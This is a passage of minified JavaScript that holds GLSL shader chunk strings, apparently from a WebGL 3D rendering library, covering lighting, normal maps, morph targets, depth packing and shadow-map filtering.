		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,md=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )
		iblIrradiance += getIBLIrradiance( geometryNormal );
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		radiance += getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		radiance += getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,_d=`#if defined( RE_IndirectDiffuse )
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,gd=`#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )
	gl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,vd=`#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,xd=`#ifdef USE_LOGDEPTHBUF
	#ifdef USE_LOGDEPTHBUF_EXT
		varying float vFragDepth;
		varying float vIsPerspective;
	#else
		uniform float logDepthBufFC;
	#endif
#endif`,Ed=`#ifdef USE_LOGDEPTHBUF
	#ifdef USE_LOGDEPTHBUF_EXT
		vFragDepth = 1.0 + gl_Position.w;
		vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
	#else
		if ( isPerspectiveMatrix( projectionMatrix ) ) {
			gl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;
			gl_Position.z *= gl_Position.w;
		}
	#endif
#endif`,yd=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = vec4( mix( pow( sampledDiffuseColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), sampledDiffuseColor.rgb * 0.0773993808, vec3( lessThanEqual( sampledDiffuseColor.rgb, vec3( 0.04045 ) ) ) ), sampledDiffuseColor.w );
	
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,Md=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,Sd=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,bd=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,Td=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,Ad=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,Rd=`#if defined( USE_MORPHCOLORS ) && defined( MORPHTARGETS_TEXTURE )
	vColor *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,wd=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
			if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
		}
	#else
		objectNormal += morphNormal0 * morphTargetInfluences[ 0 ];
		objectNormal += morphNormal1 * morphTargetInfluences[ 1 ];
		objectNormal += morphNormal2 * morphTargetInfluences[ 2 ];
		objectNormal += morphNormal3 * morphTargetInfluences[ 3 ];
	#endif
#endif`,Cd=`#ifdef USE_MORPHTARGETS
	uniform float morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
		uniform sampler2DArray morphTargetsTexture;
		uniform ivec2 morphTargetsTextureSize;
		vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
			int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
			int y = texelIndex / morphTargetsTextureSize.x;
			int x = texelIndex - y * morphTargetsTextureSize.x;
			ivec3 morphUV = ivec3( x, y, morphTargetIndex );
			return texelFetch( morphTargetsTexture, morphUV, 0 );
		}
	#else
		#ifndef USE_MORPHNORMALS
			uniform float morphTargetInfluences[ 8 ];
		#else
			uniform float morphTargetInfluences[ 4 ];
		#endif
	#endif
#endif`,Pd=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
			if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
		}
	#else
		transformed += morphTarget0 * morphTargetInfluences[ 0 ];
		transformed += morphTarget1 * morphTargetInfluences[ 1 ];
		transformed += morphTarget2 * morphTargetInfluences[ 2 ];
		transformed += morphTarget3 * morphTargetInfluences[ 3 ];
		#ifndef USE_MORPHNORMALS
			transformed += morphTarget4 * morphTargetInfluences[ 4 ];
			transformed += morphTarget5 * morphTargetInfluences[ 5 ];
			transformed += morphTarget6 * morphTargetInfluences[ 6 ];
			transformed += morphTarget7 * morphTargetInfluences[ 7 ];
		#endif
	#endif
#endif`,Id=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,Ld=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,Dd=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,Nd=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,Ud=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
	#endif
#endif`,Od=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,Fd=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,kd=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,Bd=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,zd=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,Gd=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,Hd=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;
const vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );
const vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );
const float ShiftRight8 = 1. / 256.;
vec4 packDepthToRGBA( const in float v ) {
	vec4 r = vec4( fract( v * PackFactors ), v );
	r.yzw -= r.xyz * ShiftRight8;	return r * PackUpscale;
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors );
}
vec2 packDepthToRG( in highp float v ) {
	return packDepthToRGBA( v ).yx;
}
float unpackRGToDepth( const in highp vec2 v ) {
	return unpackRGBAToDepth( vec4( v.xy, 0.0, 0.0 ) );
}
vec4 pack2HalfToRGBA( vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return depth * ( near - far ) - near;
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return ( near * far ) / ( ( far - near ) * depth - far );
}`,Vd=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,Wd=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,Xd=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,qd=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,Yd=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,jd=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,$d=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		struct SpotLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	float texture2DCompare( sampler2D depths, vec2 uv, float compare ) {
		return step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );
	}
	vec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {
		return unpackRGBATo2Half( texture2D( shadow, uv ) );
	}
	float VSMShadow (sampler2D shadow, vec2 uv, float compare ){
		float occlusion = 1.0;
		vec2 distribution = texture2DDistribution( shadow, uv );
		float hard_shadow = step( compare , distribution.x );
		if (hard_shadow != 1.0 ) {
			float distance = compare - distribution.x ;
			float variance = max( 0.00000, distribution.y * distribution.y );
			float softness_probability = variance / (variance + distance * distance );			softness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );			occlusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );
		}
		return occlusion;
	}
	float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
		float shadow = 1.0;
		shadowCoord.xyz /= shadowCoord.w;
		shadowCoord.z += shadowBias;
		bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
		bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
		if ( frustumTest ) {
		#if defined( SHADOWMAP_TYPE_PCF )
			vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
			float dx0 = - texelSize.x * shadowRadius;
			float dy0 = - texelSize.y * shadowRadius;
			float dx1 = + texelSize.x * shadowRadius;
			float dy1 = + texelSize.y * shadowRadius;
			float dx2 = dx0 / 2.0;
			float dy2 = dy0 / 2.0;
			float dx3 = dx1 / 2.0;
			float dy3 = dy1 / 2.0;
			shadow = (
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )
			) * ( 1.0 / 17.0 );
		#elif defined( SHADOWMAP_TYPE_PCF_SOFT )
			vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
			float dx = texelSize.x;
			float dy = texelSize.y;
			vec2 uv = shadowCoord.xy;
			vec2 f = fract( uv * shadowMapSize + 0.5 );
			uv -= f * texelSize;
			shadow = (
				texture2DCompare( shadowMap, uv, shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + vec2( dx, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + vec2( 0.0, dy ), shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + texelSize, shadowCoord.z ) +
				mix( texture2DCompare( shadowMap, uv + vec2( -dx, 0.0 ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 0.0 ), shadowCoord.z ),
					 f.x ) +
				mix( texture2DCompare( shadowMap, uv + vec2( -dx, dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, dy ), shadowCoord.z ),
					 f.x ) +
				mix( texture2DCompare( shadowMap, uv + vec2( 0.0, -dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 0.0, 2.0 * dy ), shadowCoord.z ),
					 f.y ) +
				mix( texture2DCompare( shadowMap, uv + vec2( dx, -dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( dx, 2.0 * dy ), shadowCoord.z ),
					 f.y ) +
				mix( mix( texture2DCompare( shadowMap, uv + vec2( -dx, -dy ), shadowCoord.z ),
						  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, -dy ), shadowCoord.z ),
						  f.x ),
					 mix( texture2DCompare( shadowMap, uv + vec2( -dx, 2.0 * dy ), shadowCoord.z ),
						  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 2.0 * dy ), shadowCoord.z ),
						  f.x ),
					 f.y )
			) * ( 1.0 / 9.0 );
		#elif defined( SHADOWMAP_TYPE_VSM )
			shadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );
		#else
			shadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );
		#endif
		}
		return shadow;
	}
	vec2 cubeToUV( vec3 v, float texelSizeY ) {
		vec3 absV = abs( v );
		float scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );
		absV *= scaleToCube;
		v *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );
		vec2 planar = v.xy;
		float almostATexel = 1.5 * texelSizeY;
		float almostOne = 1.0 - almostATexel;
		if ( absV.z >= almostOne ) {
			if ( v.z > 0.0 )
				planar.x = 4.0 - v.x;
		} else if ( absV.x >= almostOne ) {
			float signX = sign( v.x );
			planar.x = v.z * signX + 2.0 * signX;
		} else if ( absV.y >= almostOne ) {
			float signY = sign( v.y );
			planar.x = v.x + 2.0 * signY + 2.0;
			planar.y = v.z * signY - 2.0;
		}
		return vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );
	}
	float getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		vec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );
		vec3 lightToPosition = shadowCoord.xyz;
		float dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );		dp += shadowBias;
		vec3 bd3D = normalize( lightToPosition );
		#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )
			vec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;
			return (
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )
			) * ( 1.0 / 9.0 );
		#else
			return texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );
		#endif
	}
#endif`,Kd=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
#endif`,Zd=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
